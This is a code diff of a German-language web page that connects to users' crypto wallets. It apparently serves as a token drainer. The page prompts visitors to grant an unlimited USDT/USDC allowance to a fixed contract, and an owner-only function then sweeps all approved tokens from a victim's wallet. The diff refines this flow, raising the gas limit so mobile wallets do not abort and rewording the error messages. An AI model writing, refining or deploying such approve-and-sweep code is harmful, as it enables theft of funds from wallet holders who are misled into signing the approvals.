@@ -14,7 +14,7 @@
     button:active { transform: scale(0.98); opacity: 0.8; }
     button.secondary { background:#334155; }
     button.danger { background: #ef4444; margin-top: 5px; }
-    .mono { font-family: monospace; font-size:10px; word-break:break-all; background: #000; padding: 8px; border-radius: 6px; display: block; margin-top: 5px; color: #10b981; border: 1px solid #1e293b; min-height: 15px; }
+    .mono { font-family: monospace; font-size:10px; word-break:break-all; background: #000; padding: 8px; border-radius: 6px; display: block; color: #10b981; border: 1px solid #1e293b; min-height: 15px; }
     #status { margin-top:10px; padding: 12px; border-radius: 8px; background: #0f172a; font-size: 12px; text-align: center; border: 1px dashed #334155; color: #cbd5e1; line-height: 1.4; }
     .token-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
   </style>
@@ -101,8 +101,8 @@
       
       setStatus(`⌛ Bestätige ${type} Freigabe in deiner App...`);
       
-      // Fix: Manuelles Gas-Limit erhöhen, damit Trust Wallet nicht abbricht
-      const tx = await contract.approve(CONTRACT, ethers.MaxUint256, { 
+      // Erhöhtes Gas-Limit für mobile Stabilität
+      const tx = await contract.approve(CONTRACT, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff", { 
         gasLimit: 100000 
       });
       
@@ -110,15 +110,11 @@
       await tx.wait();
       
       setStatus(`✅ ${type} freigegeben!`);
-      document.getElementById("btn" + type).style.background = "#1e293b";
+      document.getElementById("btn" + type).style.background = "#334155";
       document.getElementById("btn" + type).innerText = type + " OK";
     } catch (e) { 
       console.error(e);
-      if (e.message.includes("insufficient funds")) {
-        setStatus("❌ Fehler: Zu wenig BNB für Gebühren.");
-      } else {
-        setStatus(`❌ Fehler bei ${type}.`); 
-      }
+      setStatus(`❌ Fehler bei ${type}. Prüfe dein BNB-Guthaben!`); 
     }
   }
 
@@ -127,6 +123,7 @@
       if(!walletA) return setStatus("❌ Keine Wallet A Adresse.");
       const provider = new ethers.BrowserProvider(window.ethereum);
       const signer = await provider.getSigner();
+      // Ruft die Funktionen aus deinem Contract auf
       const funcName = type === 'USDT' ? "collectUSDTAll" : "collectUSDCAll";
       const abi = [`function ${funcName}(address f) external`];
       const contract = new ethers.Contract(CONTRACT, abi, signer);
@@ -136,7 +133,7 @@
       await tx.wait();
       setStatus(`🎉 Alle ${type} erfolgreich eingezogen!`);
     } catch (e) { 
-      setStatus("❌ Fehler: Nur Owner erlaubt."); 
+      setStatus("❌ Fehler: Nur der Owner-Account darf das!"); 
     }
   }
 </script>
